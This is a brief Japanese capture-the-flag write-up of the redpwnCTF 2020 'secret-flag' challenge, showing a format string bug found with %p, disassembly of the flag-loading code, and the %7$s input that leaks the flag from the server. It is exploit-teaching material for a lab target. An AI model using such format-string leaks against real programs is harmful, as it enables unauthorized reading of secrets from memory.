# secret-flag

> There's a super secret flag in printf that allows you to LEAK the data at an address??

secret-flagという実行ファイルが添付されていた。

## solution

secret-flagを実行してみる。
```
$ ./secret-flag
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%p
Hello there: 0x7fffffffbce0
```

この結果からFSBの脆弱性があることがわかる。

```
 92f:   31 c0                   xor    eax,eax
 931:   bf 00 01 00 00          mov    edi,0x100
 936:   e8 a5 fe ff ff          call   7e0 <malloc@plt>
 93b:   48 89 45 d8             mov    QWORD PTR [rbp-0x28],rax
 93f:   be 00 00 00 00          mov    esi,0x0
 944:   48 8d 3d 5d 01 00 00    lea    rdi,[rip+0x15d]        # aa8 <__cxa_finalize@plt+0x2a8>
 94b:   b8 00 00 00 00          mov    eax,0x0
 950:   e8 9b fe ff ff          call   7f0 <open@plt>
 955:   89 45 d4                mov    DWORD PTR [rbp-0x2c],eax
 958:   48 8b 4d d8             mov    rcx,QWORD PTR [rbp-0x28]
 95c:   8b 45 d4                mov    eax,DWORD PTR [rbp-0x2c]
 95f:   ba 00 01 00 00          mov    edx,0x100
 964:   48 89 ce                mov    rsi,rcx
 967:   89 c7                   mov    edi,eax
 969:   b8 00 00 00 00          mov    eax,0x0
 96e:   e8 4d fe ff ff          call   7c0 <read@plt>
```

逆アセンブルしてアセンブリを読んでみるとmallocしてopenしてreadしている部分がある。
この部分でflagを読み込んでいる。

この部分から[rbp-0x28]にmallocで確保したメモリのアドレスがあり、そこにflagが書き込まれていることがわかる。
gdbを使って調べると、%7$pを入力した時に[rbp-0x28]にある値と一致したので、あとは%pではなく%sで文字列として読み取ってやるとフラグが手に入る

```
$ python solve.py
[+] Opening connection to 2020.redpwnc.tf on port 31826: Done
[+] Receiving all data: Done (126B)
[*] Closed connection to 2020.redpwnc.tf port 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w}
```
